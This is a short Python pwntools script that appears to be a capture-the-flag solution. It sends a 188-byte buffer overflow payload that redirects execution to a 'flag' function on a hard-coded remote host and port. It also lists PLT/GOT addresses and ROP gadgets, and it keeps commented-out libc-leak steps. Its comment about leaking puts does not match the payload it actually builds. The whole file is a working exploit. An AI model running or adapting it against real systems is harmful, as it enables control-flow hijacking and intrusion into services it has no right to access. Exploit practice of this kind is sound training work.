#!/usr/bin/python

from pwn import *

# PLT table function locations
printf_plt = 0x08049030
gets_plt = 0x08049040
fgets_plt = 0x08049050
puts_plt = 0x08049070
start_libc_plt = 0x08049090
flag = 0x080491e2

# GOT table function locations
printf_got = 0x0804c00c
get_got = 0x0804c010
fgets_got = 0x0804c014
puts_got = 0x0804c01c
start_libc_got = 0x0804c024

# ROP gadgets, pop rets
pr = 0x0804938b
ppr = 0x0804938a
pppr = 0x08049389

# string values to use as arguments in functions
ed = 0x8048303
s_str = 0xf7f527a7

def main():
    # start the vulnerable process
    p = remote("178.128.162.158", 30166)
    # Create the payload with 188 A's to trigger the buffer overflow
    payload = b"A" * 188
    # Add puts@plt to payload and leak the puts@libc location
    payload += p32(flag)
    payload += p32(0x41414141)
    payload += p32(0xdeadbeef)
    payload += p32(0xc0ded00d)
#    payload += p32(ppr)
#    payload += p32(s_str)
#    payload += p32(puts_got)

    p.send(payload)

#    output = p.recv(29)
#    log.info("Testing recv: %s" % output)

#    output2 = p.recv(176)
#    puts_addr = u32(b"\x90\x04\x8a\x93\x04\xa7'\xf5\xf7\xc0\x04")
#    log.info("Output2: %s" % output2)

    p.interactive()


if __name__ == "__main__":
    main()
